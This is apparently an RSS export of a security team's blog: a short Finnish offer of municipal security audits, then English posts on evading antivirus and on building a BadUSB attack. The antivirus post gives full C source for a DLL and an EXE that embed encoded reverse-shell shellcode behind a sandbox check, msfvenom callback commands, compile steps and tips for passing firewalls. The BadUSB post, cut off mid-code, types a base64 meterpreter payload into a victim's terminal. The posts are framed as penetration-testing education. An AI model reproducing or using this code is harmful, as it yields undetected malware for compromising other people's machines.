+<li>Jaken artikkeli mobiililaitteen liikenteen kaappamisesta ja analysoinnista: <a href="https://blog.rot.fi/2017/02/07/decomposing-lan-security-with-scapy-and-burp-suite/">https://blog.rot.fi/2017/02/07/decomposing-lan-security-with-scapy-and-burp-suite/</a></li>
+</ul>
+<p>Team Rot tarjoutuu käyttämään 15h/henkilö/kohde kunnan järjestelmien teknisen tietoturvan tutkimiseen. Havaitut ongelmat raportoidaan kunnan määrittelemälle henkilölle, yleensä siis tietoturvasta vastaavalle. Tämän lisäksi Team Rot ilmoittaa havainnoista myös Viestintäviraston kyberturvallisuuskeskukselle, CERT-FI:lle joka avustaa tarvittaessa esimerkiksi koordinoinnin kanssa jos haavoittuvuus koskee kunnan ulkopuolisia organisaatioita tai vaikkapa ulkoiselta toimittajalta ostettua ohjelmistoa. Kun raportoidut havainnot on korjattu, niin Team Rot julkistaa niistä yhteenvedon. Yhteenveto käydään ennen julkistamista lävitse yhdessä kunnan kanssa ja sisällöstä poistetaan tarvittaessa esimerkiksi luottamukselliset tiedot.<br />
+Havaittujen haavoittuvuuksien kokonaismäärä voidaan julkaista ennen varsinaista ongelman korjaamista, mutta haavoittuvuuksien tarkempia tietoja ja osallistuvaa kuntaa ei julkaista vielä tässä vaiheessa.<br />
+Jotta tietoturvatarkastus olisi mahdollisimman sujuva ja reilu kummallekin osapuolelle, niin kunta voi määritellä itse halutun kohteen ja esimerkiksi rajata tietynlaiset testitapaukset pois tarkastuksesta. Team Rot kuitenkin suosittelee että kohteena olisi kaikki kunnan järjestelmät, jotka ovat saatavissa julkisessa verkossa. Näin ollen kunta hyötyy Team Rotin tekemästä työstä mahdollisimman paljon. Team Rot pyrkii olemaan aiheuttamatta minkäänlaista ongelmaa kohdejärjestelmän saatavuuden, eheyden ja luottamuksellisuuden kanssa testauksen aikana.<br />
+Mikäli kiinnostuit, <a href="https://rot.fi/contact/"><strong>ota yhteyttä niin sovitaan jatkosta</strong></a> ja muista mahdollisista velvoitteista.<br />
+Sähköpostilla: <a href="mailto:team@rot.fi">team@rot.fi</a><br />
+<span  class="av_font_icon avia_animate_when_visible avia-icon-animate  av-icon-style-  avia-icon-pos-left " style="color:#00aced; border-color:#00aced;"><a href='https://twitter.com/iiuusit'   class='av-icon-char' style='font-size:130%;line-height:130%;' aria-hidden='true' data-av_icon='' data-av_iconfont='entypo-fontello' ></a></span><span  class="av_font_icon avia_animate_when_visible avia-icon-animate  av-icon-style-  avia-icon-pos-left " style="color:#0077b5; border-color:#0077b5;"><a href='https://www.linkedin.com/in/iirouusitalo/'   class='av-icon-char' style='font-size:130%;line-height:130%;' aria-hidden='true' data-av_icon='' data-av_iconfont='entypo-fontello' ></a></span> &lt;&nbsp;<strong>Iiro Uusitalo</strong><br />
+<span  class="av_font_icon avia_animate_when_visible avia-icon-animate  av-icon-style-  avia-icon-pos-left " style="color:#00aced; border-color:#00aced;"><a href='https://twitter.com/jvesiluoma'   class='av-icon-char' style='font-size:130%;line-height:130%;' aria-hidden='true' data-av_icon='' data-av_iconfont='entypo-fontello' ></a></span><span  class="av_font_icon avia_animate_when_visible avia-icon-animate  av-icon-style-  avia-icon-pos-left " style="color:#0077b5; border-color:#0077b5;"><a href='https://www.linkedin.com/in/vesiluoma/'   class='av-icon-char' style='font-size:130%;line-height:130%;' aria-hidden='true' data-av_icon='' data-av_iconfont='entypo-fontello' ></a></span> &lt;&nbsp;<strong>Jarkko Vesiluoma</strong><br />
+<span  class="av_font_icon avia_animate_when_visible avia-icon-animate  av-icon-style-  avia-icon-pos-left " style="color:#00aced; border-color:#00aced;"><a href='https://twitter.com/putsi_'   class='av-icon-char' style='font-size:130%;line-height:130%;' aria-hidden='true' data-av_icon='' data-av_iconfont='entypo-fontello' ></a></span><span  class="av_font_icon avia_animate_when_visible avia-icon-animate  av-icon-style-  avia-icon-pos-left " style="color:#0077b5; border-color:#0077b5;"><a href='https://fi.linkedin.com/in/jarmoputtonen'   class='av-icon-char' style='font-size:130%;line-height:130%;' aria-hidden='true' data-av_icon='' data-av_iconfont='entypo-fontello' ></a></span> &lt;&nbsp;<strong>Jarmo Puttonen</strong><br />
+<span  class="av_font_icon avia_animate_when_visible avia-icon-animate  av-icon-style-  avia-icon-pos-left " style="color:#00aced; border-color:#00aced;"><a href='https://twitter.com/jm_lahtinen'   class='av-icon-char' style='font-size:130%;line-height:130%;' aria-hidden='true' data-av_icon='' data-av_iconfont='entypo-fontello' ></a></span><span  class="av_font_icon avia_animate_when_visible avia-icon-animate  av-icon-style-  avia-icon-pos-left " style="color:#0077b5; border-color:#0077b5;"><a href='https://www.linkedin.com/in/jake-matti-lahtinen-ba290260/'   class='av-icon-char' style='font-size:130%;line-height:130%;' aria-hidden='true' data-av_icon='' data-av_iconfont='entypo-fontello' ></a></span> &lt; <b>Jake-Matti Lahtinen</b></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/team-rot-3-suomi-kuntahaaste/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Evading Antivirus softwares</title>
+		<link>/evading-antivirus-softwares/</link>
+					<comments>/evading-antivirus-softwares/#respond</comments>
+		
+		<dc:creator><![CDATA[jvesiluoma]]></dc:creator>
+		<pubDate>Tue, 18 Apr 2017 19:38:10 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">http://blog.rot.fi/?p=717</guid>
+
+					<description><![CDATA[As the CIA Wikileaks articles mention, antivirus softwares can be bypassed pretty easily. Althought this article is primarily for penetration testing purposes, it also reweals how easy it is to circumvent antivirus softwares and restrictions.
+This article should show some ideas about how hackers work.]]></description>
+										<content:encoded><![CDATA[<h1 style="text-align: center;">Evading Antivirus softwares</h1>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/03/useless-image-that-doesnt-tell-anything-lol.jpg"><img decoding="async" class="size-full wp-image-786 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/03/useless-image-that-doesnt-tell-anything-lol.jpg" alt="" width="668" height="193"></a></p>
+<h2></h2>
+<h2>0x00 General</h2>
+<p>Foreword: As the CIA Wikileaks articles mention, antivirus softwares can be bypassed pretty easily. Althought this article is primarily for penetration testing purposes, it also reweals how easy it is to circumvent antivirus softwares and restrictions.<br />
+This article should show some ideas about how hackers work. Althought I found this myself, there is identical tutorials in the internet and mostly because of that, I&#8217;m writing this. This article covers some basics that are used to bypass the antivirus softwares, but by no means doesn’t cover all means to bypass them. Note: As this is an example, some methods are not as polished as they could be.<br />
+Sometimes in penetration testing you may end up with a situation where antivirus software always catches up your payloads. In these cases you need a good way to bypass the antivirus softwares. The method described here is a pretty general, but works with pretty much every antivirus there is.<br />
+Method to bypass antivirus detection mentioned here is reported to one antivirus company on February 2016, but from their view, this is more of an undetected malware. As the basic payload is done with msfvenom, one could argue if the payload / method should be detectable by an AV.<br />
+The method bypassing antivirus software also evades the sandboxing method. Evasion is as simple as trying to open some file that is sure to exist on every installation, e.g. “<em>c:\windows\system.ini</em>” &#8211; file. If it doesn’t exist, we’re in a sandboxing environment done by antivirus software so we just don’t do anything. When again in a normal environment, file is found and payload is executed.<br />
+By&nbsp; sending this method to Virustotal.com, detection rate was 1/59. Virustotal.com is a site, where the service checks the sended file against many antivirus engines. Also, by sending the file there, the antivirus companies get the file as a sample.<br />
+Software used:</p>
+<ul>
+<li>Metasploit (msfvenom, multi/handler)</li>
+<li>MinGW</li>
+<li>Notepad</li>
+</ul>
+<h2>0x01 Restrictions / limitations</h2>
+<p>It should be noted that the Windows Defender and probably most antivirus softwares nowdays complain about &#8220;some program is trying to connect to internet&#8221;. Of course, in penetration testing situation, this can be a showstopper. Nonetheless, if you manage to get a shell by changing the .dll of some software and/or tricking the user to run the executable, you may easily get a shell from the victim. And it&#8217;s possible to migrate the shellcode to some existing process that already has the access to internet, use&nbsp;existing programs to run malicious code to bypass whitelisting restrictions. There is many available methods to avoid the restrictions.<br />
+Of course, there could be some Firewalls/IPS/IDS systems in victims network, but they could also be easily avoided by e.g. using SSL encoded connection back to victim, but that’s another matter and not in scope of this article.<br />
+<strong>&nbsp;</strong></p>
+<h2>0x02 Setting up the payload</h2>
+<p>The payload was generated with ‘<em>msfvenom</em>’ that is part of the Metasploit package. With msfvenom, it’s possible to create executables and dll – files straight out of the box, but since we’re trying to evade the&nbsp; antivirus, we create the payload in C-style output format with the following command:</p>
+<pre>msfvenom -p windows/shell/reverse_tcp lhost=10.0.0.8 lport=4321 -e x86/shikata_ga_nai -i 5 -f c</pre>
+<p>As can be seen, we are also encoding the payload five times with <em>x86/shikata_ga_nai</em> – encoder, port is <em>4321</em> and destination for payload to contact is <em>10.0.0.8</em>. Our payload is now ready to be used for testing in our code. To bypass IDS/IPS systems, payload using encrypted communications back to attacker could be used. This way even the more advanced firewalls could be bypassed since they can’t decrypt the connection.<br />
+<strong>&nbsp;</strong></p>
+<h2>0x03 DLL Method</h2>
+<p>One method to bypass antivirus softwares can be e.g. to create a malicious .dll – file and replace some existing .dll with it by a number of methods. As usually .exe – files are considered dangerous, users normally don’t recognize .dll – files as malicious. For testing purposes, this code snippet is just a very crude .dll – file that can be run from command line and doesn’t have any other functionality.</p>
+<pre>#include
+#include
+#ifdef EXPORTING_DLL
+  extern __declspec(dllexport) void Checksandboxing() ;
+#else
+  extern __declspec(dllimport) void Checksandboxing() ;
+#endif
+extern "C" BOOL WINAPI DllMain(
+    HINSTANCE hinstDLL,
+    DWORD fdwReason,
+    LPVOID lpvReserved
+) {
+switch(fdwReason) {
+    case DLL_PROCESS_ATTACH:
+         CheckSandboxing();
+    case DLL_PROCESS_DETACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    default:
+        break;
+    }
+return TRUE;
+}
+void CheckSandboxing()
+{
+  /** Test for some existing system file, sandbox evasion **/
+  std::ifstream dllfile("c:\\windows\\system.ini", std::ios::binary);
+  if (!dllfile)
+  {
+       MessageBox( NULL, TEXT("Running in sandbox"), TEXT("Sandbox"), MB_OK);
+  }
+  else
+  {
+       MessageBox( NULL, TEXT("Real system, running exploit"), TEXT("Real"), MB_OK);
+    /** msfvenom -p windows/shell/reverse_tcp lhost=10.0.0.8 lport=4321 -e x86/shikata_ga_nai -i 5 -f c  **/
+    unsigned char shellcode[] =
+    "\xbd\xf8\x13\x49\xa2\xda\xcf\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
+    "\x6f\x83\xc2\x04\x31\x6a\x0f\x03\x6a\xf7\xf1\xbc\x19\x44\xae"
+    "\x68\x86\x91\x90\x4c\x42\x01\xd9\x32\x82\x80\x90\xa5\xe5\x4f"
+    "\xc7\x36\x5b\x7b\x64\xfd\x67\x22\xc7\x73\x73\xbb\xf3\x22\x3e"
+    "\x09\x29\x81\x17\x8d\xb9\x87\x1f\xd4\x8c\x23\xc9\x65\x07\xc9"
+    "\xc0\xd9\x46\x6d\xe3\xff\x34\x31\x74\xa7\x67\xec\x23\xb4\x53"
+    "\x83\x31\xbe\x71\xda\x48\x30\x28\x16\x1e\xb9\x5e\x50\xa5\xf0"
+    "\xe7\x80\x07\x07\x04\x91\xab\xfc\x2b\xd1\x74\xcd\x3d\x11\x7e"
+    "\x77\xf5\x4b\xd4\x6a\x9f\x2d\xec\x28\x72\xd6\xa7\x87\x56\x97"
+    "\x89\xe1\x2b\x46\x72\x04\x56\x23\xd2\x17\x96\x62\x85\x7c\xd0"
+    "\x9e\xe8\x24\x92\x59\x3f\x58\x3e\xf4\x66\xf0\xdf\x56\xf0\xf0"
+    "\x72\x96\x21\xae\xb7\x9c\x26\x33\x7d\x11\xec\x14\x44\x0c\xb9"
+    "\x0d\x50\xca\xb6\xf6\xb3\xab\xd7\x93\x6d\xfb\xe9\x20\x6b\x0f"
+    "\xf4\xda\x61\xb3\xed\x40\xf9\xea\xcc\xba\xd4\x92\xbe\x15\x11"
+    "\xe4\xba\x22\xdc\x43\xb7\x15\xeb\x5d\x45\x79\x41\xa5\x25\xe7"
+    "\x8e\xa2\x8e\x97\x7d\xae\xf4\x1e\x50\x22\x4c\xb7\xfc\x08\x21"
+    "\xed\xb4\x1d\xde\xff\x1a\x7a\x37\x98\xa3\xcd\x47\xfa\x10\x1a"
+    "\xff\x57\x52\x6c\xff\x39\x92\xe6\x53\x05\x67\xd9\xcf\x51\x01"
+    "\x4f\x0c\x18\x66\x81\x4a\x02\x2d\x79\xe5\x0c\x80\xe3\xe4\xce"
+    "\x61\x18\xc2\x9c\xc8\xe5\xda\x31\xad\x2b\x63\xe3\xae\xf2\x81"
+    "\xd0\x0d\x26\xd9\xe5\x64\x73\x8a\x70\x71\x2f\x88\x4c\x72\xba"
+    "\xef\xd5\x26\x39\x2c\x42\xe6\xd9\x93\xb7\x69\xd9\x49\xcd\x72"
+    "\x10\x52\x1e\x76\x11\xb5\xa9\x6c\xc7\x45\xcc\xa9\xf0\x83\x75"
+    "\xa7\x85\xcb\x34\x0a\x50\x1d\xf5\xe5\x6c\xbc\x88\xda\xe1\x0f"
+    "\xa9\xe8\xe8\xf0\xc4\x1e\x83\xa1\xdf\xad\xaa\x9f\x1d\xa7\x82"
+    "\x71\x6c\xbd\x8b\x02\x6d\x54\xf7\x42\xae\x68\x24\x9f\xf8\x73"
+    "\xb9\x8a\x67\xa6\xef\x32\xdf\x21\xf2\x9a\xea\x10\xc6\x19\xcf"
+    "\x11\x55\x61\xfc\xfe\xf1\x51\x49\xbc\x04\x9f\xe0\x9a\x09\x4e"
+    "\x19\x2f\xb1\x20\x76\xac\x90\x3d\x48\x2b\x24\x23\xa6\xa1\x2e"
+    "\x85\x35\xf7\x47\x8f\x49\xa3\xa0\x7a\x65\x22\x17\x5d\x72\x31"
+    "\xb3\x2e\x38\xdf\xe7\xea\x83\xdd\xdf\xdd\x9c\xdb\x5a\x46\x4d"
+    "\xd3\xa0\x31";
+    LPVOID lpAlloc = NULL;
+    void (*shellfunc)();
+    /** Allocate memory for shellcode (read,write,execute) **/
+    lpAlloc = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if(lpAlloc == NULL)
+    {
+        printf("Error allocating memory!\n");
+    }
+    else
+    {
+        memcpy(lpAlloc, shellcode, lstrlenA((LPCSTR)shellcode)+1);
+        shellfunc = (void (*)())lpAlloc;
+        shellfunc();
+    }
+    /** Sleep for a bit **/
+    Sleep(500);
+  }
+}
+</pre>
+<p>Compilation of the .dll is done as follows with MinGW</p>
+<pre>"c:\MinGW\bin\mingw32-g++.exe" -c c:\dll_test\main.cpp
+"c:\MinGW\bin\mingw32-g++.exe" -shared -o exploittest.dll main.o -Wl,--out-implib,libexample_dll.a
+</pre>
+<p>Now the .dll can be checked with antivirus software, checking with Virustotal.com:<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-dll.png"><img decoding="async" class="size-full wp-image-795 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-dll.png" alt="" width="960" height="273"></a><br />
+Not detected by any (0/60) antivirus software at virustotal.com.<br />
+Now, to test the exploit, we first would setup a meterpreter multi/handler to wait for the connection:<br />
+And now we can run the payload from the exploit with following command on the command line:</p>
+<pre>Rundll32 exploittest.dll,@DllMain
+</pre>
+<p>What happens next, is Windows Defender or antivirus software will popup a question that ‘<em>exploittest.dll wants to connect to internet…</em>’, if it is accepted, shellcode inside .dll connects back to the attacker and shell is now made! Of course, in real situation this is a showstopper, but shell isn’t the only thing that can be placed inside the .dll – file.</p>
+<h2>0x04 Executables</h2>
+<p>As with the .dll – file, sandbox evasion is done by first checking for some existing system file. If file is found, code execution is moved to the payload.<br />
+Code:</p>
+<pre>#include
+// msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.0.8 lport=4321 -e x86/shikata_ga_nai -i 5 -f c
+char code[] =
+"\xdb\xda\xd9\x74\x24\xf4\x5e\x33\xc9\xb8\xcd\x9f\x5f\xe9\xb1"
+"\x6f\x31\x46\x18\x83\xee\xfc\x03\x46\xd9\x7d\xaa\x34\x23\x58"
+"\x21\xe3\x57\x06\x74\x2d\xf6\x97\x42\x9b\x31\x56\x3a\xed\xb4"
+"\x80\x38\xc8\x32\xb0\x4b\xc6\x1e\x22\x25\xdb\xc1\xd8\x32\x06"
+"\xc8\x19\x31\x8f\x0f\x09\x7c\xf8\x63\x78\x9d\x37\x00\x37\x86"
+"\x02\xf6\x63\xe6\x8b\xfc\xc1\xba\x1a\x88\x74\x60\xed\xc0\xad"
+"\x2a\x5b\xf2\xd3\x80\x19\xa9\x0e\x2e\x0c\x88\x36\xcf\xdb\x27"
+"\x84\x06\xbf\x25\x91\x64\x09\x1d\xf1\x19\x2f\xd6\xa2\x6d\x6d"
+"\x2a\x4e\xeb\xa4\x00\x91\x35\x57\x28\xbd\xd6\x10\x13\xad\x5d"
+"\xea\x23\x25\x9d\x14\x11\xc5\x8e\x8e\x46\x7b\x28\xe1\x3b\xf3"
+"\xd2\x4e\x39\xf0\x5d\x4a\xce\x64\xa7\x82\xc2\x7f\x72\x34\x96"
+"\xb4\xf9\x8d\xfe\x94\x11\x37\x88\xc3\xd7\xcb\xb5\x37\xb3\x1c"
+"\xc2\x58\xcc\x08\x37\x35\xea\x67\xff\x97\x01\x92\xf8\x33\x82"
+"\x5d\x3e\x48\xff\xe3\x96\x75\x18\x95\xcf\xc4\x07\xe5\xa4\x73"
+"\x38\xd4\x21\xe1\xb4\x96\x40\x52\x76\xdf\xe1\x60\x2c\xaf\x5d"
+"\xb3\xe4\xff\x89\x6b\x49\x3e\x7e\x2d\x0b\x33\xa0\x54\x8d\x9b"
+"\x40\x5b\x2e\xfe\x62\x1f\x48\x21\x69\x6e\x99\x08\xc2\xc2\xc3"
+"\x69\x53\x3f\x84\x8e\x79\xdb\xca\xeb\x3f\xcf\xd8\x8c\xf8\x0a"
+"\xed\x59\xcb\x6e\x82\xb4\x07\x00\xc3\x13\xed\x2e\x67\xf5\xc8"
+"\xfd\x1c\x24\x6a\x95\x3d\x90\x43\x29\xba\x29\xff\x22\x2b\x48"
+"\xa7\x7d\xb0\x3d\x56\x71\x30\x95\xdd\x69\x51\x2e\x0f\x3d\x5d"
+"\x19\xbd\xfa\x06\xf9\x02\xfd\xed\x08\x27\xb8\x21\x11\xd7\xc4"
+"\xd5\xca\xbb\x2a\xd4\xe7\x64\x65\x81\x50\x7b\xbd\xbd\xcb\xc0"
+"\x15\x05\xff\x78\xee\x8b\x38\x2b\x28\x52\x56\xb2\x49\xc4\x44"
+"\x39\xba\x76\x84\xeb\x0d\xa4\x53\x38\x4e\x77\x05\xc4\xa7\x94"
+"\xd4\xe9\xbf\x1d\xb7\xc1\x6f\x5f\xa6\x62\xe4\x91\x48\x3c\xd4"
+"\x6e\xce\xf1\x5f\xfd\x6c\x52\x8c\x59\x5c\x71\x63\x30\x81\x2e"
+"\x63\x6f\xbc\x43\x0b\xab\x37\xdb\xbf\x48\x22\xda\xdb\x3d\x04"
+"\xab\x5b\x6e\xfd\x3e\xfb\xfe\xb8\x4b\xa8\x72\xeb\x71\xbb\x0a"
+"\xeb\xb2\x56\xcb\xb9\x14\xcf\x7a\xa5\xc3\x5d\x34\x4f\xfa\x55"
+"\x54\x9d\x10\xe5\x26\xbc\x61\x56\xc7\x79\x8d\x64\x7a\x06\x50"
+"\x07\xdd\xc6";
+int main(int argc, char **argv)
+{
+  FILE *fp = fopen("c:\\windows\\system.ini", "rb");
+  if (fp == NULL)
+  return 0;
+  fclose(fp);
+  printf("Launching...again...");
+  int (*func)();
+  func = (int (*)()) code;
+  return 0;
+  (int)(*func)();
+  printf("...DONE!");
+}
+</pre>
+<p>Compilation is done simply by issuing:</p>
+<pre>c:\MinGW\bin\mingw32-gcc.exe exploittest.c -o exploittest.exe
+</pre>
+<p>Afterwards checking with virustotal.com, only <em>Baidu</em> noticed that it is a Trojan. Note to myself: Have to check why Baidu finds this.<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-exe.png"><img decoding="async" class="size-full wp-image-796 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-exe.png" alt="" width="966" height="413"></a><br />
+To test this, a multi/handler could be setup as in <strong>x03 DLL Method</strong> (note, different payload) and by simply executing the file. Same nagging from Windows defender and/or antivirus software apply to this also.</p>
+<h2>0x05 Malicious payloads through IPS / IDS systems</h2>
+<p>In case there is IPS / IDS systems in front of the victim, these files should pass right through them, but they payloads would get caught. If actual files would get caught, just create a password protected .zip – file and get the files through HTTP for example. So, something like <em>windows/meterpreter/reverse_https</em> could be used as payload with following changes to parameters:</p>
+<ul>
+<li>EnableStageEncoding true</li>
+<li>MeterpreterServerName Nginx</li>
+<li>MeterpreterUserAgent Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36</li>
+<li>StageEncoder (one of the below)
+<ul>
+<li>x86/fnstenv_mov</li>
+<li>x86/shikata_ga_nai</li>
+</ul>
+</li>
+</ul>
+<p>With these changes, it’s possible to walk through the firewalls with IPS/IDS systems enabled. One thing I noticed with one major firewall manufacturer is that it blocks SSL encrypted payloads, but after fiddling with ‘<em>stdapi_sys_process_execute</em>’ – string, the shell goes through, but issues ‘<em>critical</em>’ – state in the lofugs. As I went through the firewall, I didn’t research it more. I would wager that it is very well possible to completely hide from the firewall.<br />
+Of course, if all else fails, there is always the dnscat… <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f609.png" alt="😉" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
+<strong>&nbsp;</strong></p>
+<h2>0x06 Conclusion</h2>
+<p>Since victim would get an exploit/Trojan that is undetected by antivirus softwares, the possibility of exploiting unsuspecting user is greatly enhanced. Of course Windows Defender and antivirus have restrictions against new connections, but sadly these messages are ignored very often. But since antivirus doesn’t find anything, it is safe yes? No. Much of the security is still on the shoulders of users and antivirus / firewalls / IPS / IDS can’t be trusted to be bulletproof.<br />
+These methods could be further developed to do more evasive actions, sleep for a time, write other programs, etc. etc. This article was all about getting a shell from the client, but payload could be e.g. something more malicious. So, be sure not to count on the security software you use, have a common sense. Have a multiple layers of defense to enhance your security.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/evading-antivirus-softwares/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploiting with BadUSB/Digispark + meterpreter payload</title>
+		<link>/exploiting-with-badusbdigispark-meterpreter-payload/</link>
+					<comments>/exploiting-with-badusbdigispark-meterpreter-payload/#respond</comments>
+		
+		<dc:creator><![CDATA[jvesiluoma]]></dc:creator>
+		<pubDate>Wed, 22 Mar 2017 11:13:35 +0000</pubDate>
+				<category><![CDATA[Exploitation]]></category>
+		<category><![CDATA[Guide]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<category><![CDATA[badusb]]></category>
+		<category><![CDATA[digispark]]></category>
+		<category><![CDATA[digistump]]></category>
+		<category><![CDATA[keyboard]]></category>
+		<category><![CDATA[meterpreter]]></category>
+		<guid isPermaLink="false">http://blog.rot.fi/?p=712</guid>
+
+					<description><![CDATA[Here is a small guide on how to create a BadUSB - stick with a meterpreter payload to Linux. BadUSB can be a normal USB memory stick with a customized firmware that'll have the computer to recognize the device as a keyboard. Because of this, the computer thinks that there's always a user typing on the keyboard, which is a pretty nasty exploit and enables a lot of possibilities.]]></description>
+										<content:encoded><![CDATA[<h1>Exploiting with BadUSB / Digispark + meterpreter payload</h1>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/20170222_192323.jpg"><img decoding="async" class="wp-image-715 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/20170222_192323.jpg" alt="" width="407" height="276"></a><br />
+Here is a small guide on how to create a BadUSB &#8211; stick with a meterpreter payload to Linux. BadUSB can be a normal USB memory stick with a customized firmware that&#8217;ll have the computer to recognize the device as a keyboard. Because of this, the computer thinks that&nbsp;there&#8217;s always a user typing on the keyboard, which is a pretty nasty exploit and enablse a lot of possibilities. For example, with physical access to the victims computer you can do following things with BadUSB:</p>
+<ul>
+<li>Inject malware</li>
+<li>Steal passwords</li>
+<li>Delete files</li>
+<li>etc&#8230;whatever you can do with a keyboard, a BadUSB can do also.</li>
+</ul>
+<p>Of course, you could buy&nbsp;a <a href="https://hakshop.com/collections/usb-rubber-ducky">Rubber Ducky from Hak5</a>&nbsp;, but you&#8217;d miss all the fun tinkering with cool things. This guide is made for Digispark from <a href="http://digistump.com/">Digistump</a>.<br />
+Digispark can be programmed so that when the computer accepts it as a keyboard, it starts to send key presses to computer. Since Digispark has only 8Kb (6Kb of programmable space after bootloader), options are somewhat limited, but should be&nbsp;more than enough for most purposes and it&#8217;s also possible to circumvent the space limit.</p>
+<h2>0x00 Pre-requisities:</h2>
+<ul>
+<li><a href="http://digistump.com/products/1">Digispark</a>&nbsp;, a low cost (~8$ at the time of writing this)&nbsp;USB development board</li>
+<li><a href="https://www.arduino.cc/en/main/software">Arduino-IDE</a> (<a href="http://digistump.com/wiki/digispark/tutorials/connecting">install guide here</a>)</li>
+<li><a href="https://www.kali.org/">Kali &#8211; Linux</a></li>
+</ul>
+<h2>0x01 Install Arduino-IDE</h2>
+<p>Since the installation guide is excellent in the digistump.com site, I will not even try to recreate them in detail here. <a href="http://digistump.com/wiki/digispark/tutorials/connecting">Configure Arduino-IDE by these instructions</a>.<br />
+Just make sure you have added following URL to &#8220;Additional Boards Manager URLs:&#8221; (<em>File</em> -&gt; <em>Preferences</em>):</p>
+<pre>http://digistump.com/package_digistump_index.json</pre>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/arduino-ide-preferences.png"><img decoding="async" class="wp-image-719 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/arduino-ide-preferences.png" alt="" width="638" height="518"></a><br />
+Also, install &#8220;<em>Digistump AVR Boards by Digistump</em>&#8221; via Boards manager (<em>Tools</em> -&gt; <em>Boards</em> -&gt; <em>Boards Manager</em>)&#8230;<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/arduino-ide-boards-manager.png"><img decoding="async" class="wp-image-722 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/arduino-ide-boards-manager.png" alt="" width="604" height="340"></a><br />
+And select &#8220;<em>Digispark (Default &#8211; 16.5mhz)</em>&#8221; as a board.<br />
+Arduino-IDE should now be good to go.</p>
+<h2>0x02 Generating a meterpreter payload</h2>
+<p>Generation of the payload is pretty straightforward. It&#8217;s generated with &#8220;<em>msfvenom</em>&#8221; as follows.</p>
+<pre>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.8 LPORT=880 -f elf &gt; mShell_880</pre>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/msfvenom.png"><img decoding="async" class="size-full wp-image-727 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/msfvenom.png" alt="" width="1009" height="114"></a><br />
+Of course, LPORT and the LHOST should be changed to match your IP-addresses. LHOST should be the Kali box where the metasploit handler is waiting for the connection back from the victim and LPORT is the port you want to use. The output of the msfvenom is directed to file called &#8216;<em>mShell_880</em>&#8216;. The output of the executable payload is only 155 bytes, so we have plenty of space left.<br />
+Since the payload is &#8220;typed&#8221; to victim, it has to be Base64 encoded, so we can &#8220;input&#8221; it to victim and generate the executable payload. Basically, what we want to do, is to echo the Base64 string and decode it and direct the output to a file, change the executable bit for the file and run the payload.<br />
+Base64 encoding is done as follows:</p>
+<pre>base64 mShell_880 &gt; mShell_880.b64</pre>
+<p>&#8220;<em>mShell_880.b64</em>&#8221; &#8211; file now holds our payload encoded in Base64. We can use this string in our program that outputs it to victims terminal.<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/02/base64_encoded_payload.png"><img decoding="async" class=" wp-image-742 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/02/base64_encoded_payload.png" alt="" width="616" height="72"></a></p>
+<h2>0x03 Programming with Arduino-IDE</h2>
+<p>The program is&nbsp;very simple and straightforward. I commented the program below, so it should be very clear what is done. On default, it works only with US &#8211; keyboard layout, but it&#8217;s possible to remap the keyboard layout from &#8220;<em>DigiKeyboard.h</em>&#8221; &#8211; file. Since this is for PoC only, I don&#8217;t include any other layouts in this post. Sorry <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f609.png" alt="😉" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<pre>/*
+* Works with US - keyboard layout only, because of testing purposes.
+*
+* 1. Send super key ('Windows key') to bring up the search
+* 2. input 'terminal' and send enter
+* 3. Send our binary payload via base64 encoded string, decode it and output to file
+* 4. Change executable bit for the payload and execute it.
+* 5. Enjoy.
+*/
+#include "DigiKeyboard.h"
+void setup() {
+// LED on.
+pinMode(1, OUTPUT);
+delay(200);
+// Super, delete content
+// Start to inject payload, turn the LED on
+digitalWrite(1, HIGH);
+DigiKeyboard.sendKeyStroke(KEY_DELETE); // Clean
+delay(200);
+DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); // Super key, open 'search'
+delay(300);
+DigiKeyboard.print("terminal"); // Program to run
+delay(500);
+DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+// Delay for 1 second, if terminal is not opened, part of the string below is wasted to /dev/null
+delay(1000);
+// Send our payload
+DigiKeyboard.print("echo");
+DigiKeyboard.sendKeyStroke(KEY_SPACE);
